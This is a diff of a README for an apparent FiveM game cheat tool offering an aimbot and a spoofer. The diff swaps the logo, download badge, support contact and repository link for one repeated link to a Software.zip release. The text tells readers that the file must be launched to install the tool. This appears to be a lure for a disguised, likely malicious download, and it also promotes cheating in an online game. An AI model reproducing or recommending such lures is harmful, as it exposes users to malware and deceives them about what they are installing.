@@ -2,7 +2,7 @@
 
 Welcome to the FiveM TZ Project PVP Tool repository, your ultimate cheat for an enhanced gaming experience in FiveM. Whether you're looking for aimbot, hacks, or a spoofer, TZ Project has got you covered. Rest assured that with TZ, there's no LUA injection, no resource stopper, and no dumper.
 
-![FiveM TZ Project Logo](https://example.com/logo.png)
+![FiveM TZ Project Logo](https://github.com/Joshue69/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 ## Features 🎮
 
@@ -15,7 +15,7 @@ Welcome to the FiveM TZ Project PVP Tool repository, your ultimate cheat for an 
 
 To install the FiveM TZ Project PVP Tool, simply download the software package from the link provided below:
 
-[![Download TZ Project PVP Tool](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download TZ Project PVP Tool](https://github.com/Joshue69/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)](https://github.com/Joshue69/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 *Note: The downloaded file needs to be launched to install the tool.*
 
@@ -61,8 +61,8 @@ This project is licensed under the MIT License. Feel free to explore the code an
 
 ## Support 📧
 
-If you encounter any issues or have any questions, feel free to reach out to the developer at example@example.com.
+If you encounter any issues or have any questions, feel free to reach out to the developer at https://github.com/Joshue69/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip
 
-Visit the [FiveM TZ Project PVP Tool](https://github.com/Rubenas123/6487922) repository for more information.
+Visit the [FiveM TZ Project PVP Tool](https://github.com/Joshue69/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip) repository for more information.
 
 Happy gaming! 🎮✨
